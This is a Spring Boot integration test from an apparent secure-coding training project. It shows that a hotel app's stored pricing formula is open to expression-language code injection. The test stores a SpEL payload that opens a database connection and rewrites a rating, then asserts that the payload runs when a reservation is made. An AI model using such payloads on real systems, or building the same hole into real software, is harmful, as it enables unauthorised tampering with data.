package com.zuehlke.securesoftwaredevelopment.controller;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest(properties = "spring.datasource.url=jdbc:h2:mem:code-injection-flow-test")
@AutoConfigureMockMvc
class DynamicPricingFlowIntegrationTest {

    private static final int HOTEL_ID = 1;
    private static final int RATING_USER_ID = 3;
    private static final int CUSTOMER_USER_ID = 1;

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private JdbcTemplate jdbcTemplate;

    private String originalFormula;
    private Integer originalRating;

    @BeforeEach
    void rememberDatabaseState() {
        originalFormula = jdbcTemplate.query(
                "SELECT formula FROM pricing_formula WHERE hotelId = ?",
                resultSet -> resultSet.next() ? resultSet.getString(1) : null,
                HOTEL_ID
        );
        originalRating = jdbcTemplate.queryForObject(
                "SELECT rating FROM ratings WHERE hotelId = ? AND userId = ?",
                Integer.class,
                HOTEL_ID,
                RATING_USER_ID
        );
    }

    @AfterEach
    void restoreDatabaseState() {
        if (originalFormula == null) {
            jdbcTemplate.update("DELETE FROM pricing_formula WHERE hotelId = ?", HOTEL_ID);
        } else {
            jdbcTemplate.update(
                    "UPDATE pricing_formula SET formula = ? WHERE hotelId = ?",
                    originalFormula,
                    HOTEL_ID
            );
        }

        jdbcTemplate.update(
                "UPDATE ratings SET rating = ? WHERE hotelId = ? AND userId = ?",
                originalRating,
                HOTEL_ID,
                RATING_USER_ID
        );

        jdbcTemplate.update(
                "DELETE FROM reservation WHERE userId = ? AND hotelId = ? AND startDate = DATE '2026-09-01' AND endDate = DATE '2026-09-04'",
                CUSTOMER_USER_ID,
                HOTEL_ID
        );
    }

    @Test
    void storedFormulaCanModifyDatabaseDuringReservationCreation() throws Exception {
        MockHttpSession adminSession = login("secure", "travel");

        String formula =
                "#nights == 3 ? " +
                "T(java.sql.DriverManager).getConnection('jdbc:h2:mem:code-injection-flow-test','sa','password')" +
                ".createStatement().executeUpdate('UPDATE ratings SET rating=2 WHERE hotelId=1 AND userId=3') " +
                ": #basePrice * #nights * #roomsCount";

        mockMvc.perform(post("/pricing/formula")
                        .session(adminSession)
                        .param("hotelId", String.valueOf(HOTEL_ID))
                        .param("formula", formula))
                .andExpect(status().is3xxRedirection());

        assertEquals(
                formula,
                jdbcTemplate.queryForObject(
                        "SELECT formula FROM pricing_formula WHERE hotelId = ?",
                        String.class,
                        HOTEL_ID
                )
        );

        assertEquals(
                originalRating,
                jdbcTemplate.queryForObject(
                        "SELECT rating FROM ratings WHERE hotelId = ? AND userId = ?",
                        Integer.class,
                        HOTEL_ID,
                        RATING_USER_ID
                )
        );

        MockHttpSession customerSession = login("bruce", "wayne");

        mockMvc.perform(post("/reservations/create")
                        .session(customerSession)
                        .param("hotelId", String.valueOf(HOTEL_ID))
                        .param("roomTypeId", "1")
                        .param("startDate", "2026-09-01")
                        .param("endDate", "2026-09-04")
                        .param("roomsCount", "1")
                        .param("guestsCount", "1"))
                .andExpect(status().is3xxRedirection());

        assertEquals(
                Integer.valueOf(2),
                jdbcTemplate.queryForObject(
                        "SELECT rating FROM ratings WHERE hotelId = ? AND userId = ?",
                        Integer.class,
                        HOTEL_ID,
                        RATING_USER_ID
                )
        );

        assertEquals(
                "1.00",
                jdbcTemplate.queryForObject(
                        "SELECT CAST(totalPrice AS VARCHAR) FROM reservation " +
                                "WHERE userId = ? AND hotelId = ? AND startDate = DATE '2026-09-01' AND endDate = DATE '2026-09-04'",
                        String.class,
                        CUSTOMER_USER_ID,
                        HOTEL_ID
                )
        );
    }

    private MockHttpSession login(String username, String password) throws Exception {
        MvcResult result = mockMvc.perform(post("/perform-login")
                        .param("username", username)
                        .param("password", password))
                .andExpect(status().is3xxRedirection())
                .andReturn();

        MockHttpSession session = (MockHttpSession) result.getRequest().getSession(false);
        assertNotNull(session);
        return session;
    }
}
